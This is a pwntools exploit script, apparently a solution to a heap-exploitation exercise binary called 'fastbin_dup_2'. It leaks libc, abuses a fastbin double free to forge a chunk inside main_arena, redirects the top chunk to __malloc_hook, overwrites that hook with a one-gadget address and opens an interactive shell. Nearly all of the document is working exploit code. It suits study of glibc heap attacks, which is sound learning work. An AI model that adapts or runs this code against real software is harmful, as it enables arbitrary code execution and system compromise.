#!/usr/bin/python3
from pwn import *
exe = "./fastbin_dup_2"
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

gs = '''
init-pwndbg
continue
'''.format(**locals())

def start(argv=[], *a, **kw):
  if args.GDB:  # GDB NOASLR
    context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
    return gdb.debug([exe] + argv, gdbscript=gs, *a, **kw)
  else:
    return process([exe] + argv, *a, **kw)

# Index of allocated chunks.
index = 0

# Returns chunk index.
def malloc(size, data):
  global index
  io.send(b"1")
  io.sendafter(b"size: ", str(size).encode())
  io.sendafter(b"data: ", data)
  io.recvuntil(b"> ")
  index += 1
  return index - 1

def free(index):
  io.send(b"2")
  io.sendafter(b"index: ", str(index).encode())
  io.recvuntil(b"> ")

io = start()

io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# 1. Create 0x60 fake chunk in main_arena
# 1.1.write 0x61 into 0x50 slot chunks of main_arena
# for fake size chunk
chunk_A = malloc(0x48, b"A"*8)
chunk_B = malloc(0x48, b"B"*8)
free(chunk_A)
free(chunk_B)
free(chunk_A)

malloc(0x48, p64(0x61))
malloc(0x48, b'C'*8)
malloc(0x48, b'D'*8)

# 1.2.Link the fake chunk into the 0x60 fastbin
chunk_E = malloc(0x58, b'E'*8)
chunk_F = malloc(0x58, b'F'*8)
free(chunk_E)
free(chunk_F)
free(chunk_E)

malloc(0x58, p64(libc.sym.main_arena + 0x20))
# man sh -s: stdin -p: priv
malloc(0x58, b'-s\0')
malloc(0x58, b'-p\0')

# 2. overwrite the top chunk pointer
# top chunk need a size field that isn't zero
# and < p/x av->system_mem
malloc(0x56, b'I'*48 + p64(libc.sym.__malloc_hook - 35))

# 3. overwrite __malloc_hook
malloc(0x38, b'J'*19 + p64(libc.address + 0xe1fa1))

malloc(1, b'')
io.interactive()
